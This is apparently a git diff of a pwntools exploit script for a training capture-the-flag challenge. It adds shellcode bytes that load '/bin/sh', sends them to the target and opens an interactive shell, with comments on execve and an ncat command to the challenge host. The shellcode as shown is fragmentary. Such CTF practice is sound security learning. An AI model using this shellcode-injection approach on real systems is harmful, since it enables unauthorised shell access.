@@ -2,7 +2,9 @@ from pwn import *
 
 COMMANDS = """
 """
-shellcode = b""
+shellcode = b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00"
+
+
 
 
 #ncat --ssl back-to-shell.training.offensivedefensive.it 8080
@@ -15,19 +17,5 @@ else:
 p.send(shellcode)
 p.interactive()
 
-#0x40116e
-
 #execve("/bin/sh\0", NULL, NULL)
-
-#(rdi, rsi, rdx), r10, r8, r9
-#const char *filename, const char *const *argv, const char *const *envp
-
-0x7ffeeec9e500
-
-c = """
-push 0x3b
-pop rax
-xor esi, esi
-xor edx, edx
-syscall
-"""
+#0x0068732f6e69622f
